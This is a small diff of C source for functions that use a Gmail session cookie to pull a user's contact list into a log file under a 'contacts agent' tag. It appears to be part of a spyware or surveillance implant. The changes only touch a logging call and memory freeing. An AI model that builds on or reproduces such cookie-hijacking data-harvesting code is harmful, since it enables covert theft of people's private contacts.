@@ -50,7 +50,7 @@ DWORD ParseContacts(char *cookie, char *ik_val, WCHAR *user_name)
 		return ret_val;
 	parser1 = (char *)r_buffer;
 
-	hfile = Log_CreateFile2(PM_CONTACTSAGENT, NULL, 0,0);
+	hfile = Log_CreateFile2(PM_CONTACTSAGENT,"g_", NULL, 0,0);
 	LOOP {
 		flags = 0;
 		parser1 = strstr(parser1, GM_CONTACT_IDENTIFIER);
@@ -274,7 +274,8 @@ DWORD HandleGMail(char **cookie)
 			break;
 		}
 		else{
-			SAFE_FREE(ptr);
+			free(r_buffer);
+			r_buffer = 0;
 			Sleep(500);
 		}
 	}
